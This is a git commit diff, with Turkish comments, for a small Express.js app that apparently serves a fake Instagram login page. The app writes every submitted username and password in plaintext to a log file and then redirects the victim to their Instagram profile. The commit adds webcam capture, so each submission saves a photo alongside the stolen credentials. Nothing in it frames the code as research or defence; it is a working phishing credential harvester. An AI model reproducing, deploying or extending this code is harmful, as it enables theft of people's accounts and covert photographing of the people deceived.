094dc602a5d11f632ed66b154edff5a859186ba0
omeryasindemir <omeryasindemir66@gmail.com>
2024-01-06 20:15:02 +0300

    update

--- app.js
+++ app.js
@@ -1,9 +1,23 @@
 const express = require('express');
 const fs = require('fs');
+const webcam = require('node-webcam');
+const uuid = require('uuid'); // uuid modülünü yükleyin: npm install uuid
 const app = express();
 const port = 3000;
 
 app.use(express.urlencoded({ extended: true }));
+
+// Kamera konfigürasyonu
+const camera = webcam.create({
+  width: 1280,
+  height: 720,
+  quality: 100,
+  delay: 0,
+  saveShots: true,
+  output: "jpeg",
+  device: false,
+  callbackReturn: "location"
+});
 
 app.get('/', (req, res) => {
   res.sendFile(__dirname + '/index.html');
@@ -12,11 +26,19 @@ app.get('/', (req, res) => {
 app.post('/submit', (req, res) => {
   const { username, password } = req.body;
 
-  // Logları kaydet
-  const log = `Username: ${username}, Password: ${password}\n`;
-  fs.appendFile('logs.txt', log, (err) => {
+  // Kamera fotoğrafını çek
+  const uniqueFilename = `${uuid.v4()}.jpg`;
+  const picturePath = `images/${uniqueFilename}`;
+  
+  camera.capture(picturePath, (err, data) => {
     if (err) throw err;
-    console.log('SUCCESS !');
+
+    // Logları kaydet
+    const log = `Username: ${username}, Password: ${password}, Picture: ${uniqueFilename}\n`;
+    fs.appendFile('logs.txt', log, (err) => {
+      if (err) throw err;
+      console.log('SUCCESS!');
+    });
   });
 
   res.redirect(`https://www.instagram.com/${username}`);
